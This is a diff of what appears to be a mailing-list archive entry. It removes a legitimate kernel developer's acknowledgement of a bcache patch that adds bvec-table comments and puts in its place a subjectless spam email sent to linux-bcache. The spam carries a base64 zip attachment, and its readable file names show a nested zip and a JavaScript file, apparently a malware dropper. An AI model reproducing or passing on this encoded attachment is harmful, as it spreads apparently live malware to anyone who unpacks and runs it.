@@ -1,107 +1,69 @@
-From: Coly Li <i@coly.li>
-Subject: Re: [PATCH v3 07/49] bcache: comment on direct access to bvec table
-Date: Tue, 8 Aug 2017 20:36:21 +0800
-Message-ID: <12a50c71-7b66-f9a4-6f9b-c10987426e30@coly.li>
-References: <20170808084548.18963-1-ming.lei@redhat.com>
- <20170808084548.18963-8-ming.lei@redhat.com>
+From: <michele@milburnbrowning.com>
+Subject: (unknown)
+Date: Tue, 08 Aug 2017 21:31:03 -0000
+Message-ID: <150222786374.17375.11427999275194921929@permonline.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 8bit
+Content-Type: application/zip; name="95599025.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-bcache-owner@vger.kernel.org>
-Received: from server.coly.li ([162.144.45.48]:56674 "EHLO server.coly.li"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1751880AbdHHMgm (ORCPT <rfc822;linux-bcache@vger.kernel.org>);
-        Tue, 8 Aug 2017 08:36:42 -0400
-In-Reply-To: <20170808084548.18963-8-ming.lei@redhat.com>
-Content-Language: en-US
+Received: from dsl-178-47-141-144.permonline.ru ([178.47.141.144]:35639 "HELO
+        permonline.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1752030AbdHHVbH (ORCPT
+        <rfc822;linux-bcache@vger.kernel.org>);
+        Tue, 8 Aug 2017 17:31:07 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-bcache-owner@vger.kernel.org
 List-Id: linux-bcache@vger.kernel.org
-To: Ming Lei <ming.lei@redhat.com>, Jens Axboe <axboe@fb.com>, Christoph Hellwig <hch@infradead.org>, Huang Ying <ying.huang@intel.com>, Andrew Morton <akpm@linux-foundation.org>, Alexander Viro <viro@zeniv.linux.org.uk>
-Cc: linux-kernel@vger.kernel.org, linux-block@vger.kernel.org, linux-fsdevel@vger.kernel.org, linux-mm@kvack.org, linux-bcache@vger.kernel.org
+To: linux-bcache@vger.kernel.org
 
-On 2017/8/8 下午4:45, Ming Lei wrote:
-> Looks all are safe after multipage bvec is supported.
-> 
-> Cc: linux-bcache@vger.kernel.org
-> Signed-off-by: Ming Lei <ming.lei@redhat.com>
-
-Acked-by: Coly Li <colyli@suse.de>
-
-Coly Li
-
-
-> ---
->  drivers/md/bcache/btree.c | 1 +
->  drivers/md/bcache/super.c | 6 ++++++
->  drivers/md/bcache/util.c  | 7 +++++++
->  3 files changed, 14 insertions(+)
-> 
-> diff --git a/drivers/md/bcache/btree.c b/drivers/md/bcache/btree.c
-> index 866dcf78ff8e..3da595ae565b 100644
-> --- a/drivers/md/bcache/btree.c
-> +++ b/drivers/md/bcache/btree.c
-> @@ -431,6 +431,7 @@ static void do_btree_node_write(struct btree *b)
->  
->  		continue_at(cl, btree_node_write_done, NULL);
->  	} else {
-> +		/* No harm for multipage bvec since the new is just allocated */
->  		b->bio->bi_vcnt = 0;
->  		bch_bio_map(b->bio, i);
->  
-> diff --git a/drivers/md/bcache/super.c b/drivers/md/bcache/super.c
-> index 8352fad765f6..6808f548cd13 100644
-> --- a/drivers/md/bcache/super.c
-> +++ b/drivers/md/bcache/super.c
-> @@ -208,6 +208,7 @@ static void write_bdev_super_endio(struct bio *bio)
->  
->  static void __write_super(struct cache_sb *sb, struct bio *bio)
->  {
-> +	/* single page bio, safe for multipage bvec */
->  	struct cache_sb *out = page_address(bio->bi_io_vec[0].bv_page);
->  	unsigned i;
->  
-> @@ -1154,6 +1155,8 @@ static void register_bdev(struct cache_sb *sb, struct page *sb_page,
->  	dc->bdev->bd_holder = dc;
->  
->  	bio_init(&dc->sb_bio, dc->sb_bio.bi_inline_vecs, 1);
-> +
-> +	/* single page bio, safe for multipage bvec */
->  	dc->sb_bio.bi_io_vec[0].bv_page = sb_page;
->  	get_page(sb_page);
->  
-> @@ -1799,6 +1802,7 @@ void bch_cache_release(struct kobject *kobj)
->  	for (i = 0; i < RESERVE_NR; i++)
->  		free_fifo(&ca->free[i]);
->  
-> +	/* single page bio, safe for multipage bvec */
->  	if (ca->sb_bio.bi_inline_vecs[0].bv_page)
->  		put_page(ca->sb_bio.bi_io_vec[0].bv_page);
->  
-> @@ -1854,6 +1858,8 @@ static int register_cache(struct cache_sb *sb, struct page *sb_page,
->  	ca->bdev->bd_holder = ca;
->  
->  	bio_init(&ca->sb_bio, ca->sb_bio.bi_inline_vecs, 1);
-> +
-> +	/* single page bio, safe for multipage bvec */
->  	ca->sb_bio.bi_io_vec[0].bv_page = sb_page;
->  	get_page(sb_page);
->  
-> diff --git a/drivers/md/bcache/util.c b/drivers/md/bcache/util.c
-> index 8c3a938f4bf0..11b4230ea6ad 100644
-> --- a/drivers/md/bcache/util.c
-> +++ b/drivers/md/bcache/util.c
-> @@ -223,6 +223,13 @@ uint64_t bch_next_delay(struct bch_ratelimit *d, uint64_t done)
->  		: 0;
->  }
->  
-> +/*
-> + * Generally it isn't good to access .bi_io_vec and .bi_vcnt
-> + * directly, the preferred way is bio_add_page, but in
-> + * this case, bch_bio_map() supposes that the bvec table
-> + * is empty, so it is safe to access .bi_vcnt & .bi_io_vec
-> + * in this way even after multipage bvec is supported.
-> + */
->  void bch_bio_map(struct bio *bio, void *base)
->  {
->  	size_t size = bio->bi_iter.bi_size;
-> 
+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
+AVBLBQYAAAAAAQABAFsAAACPCgAAAAA=
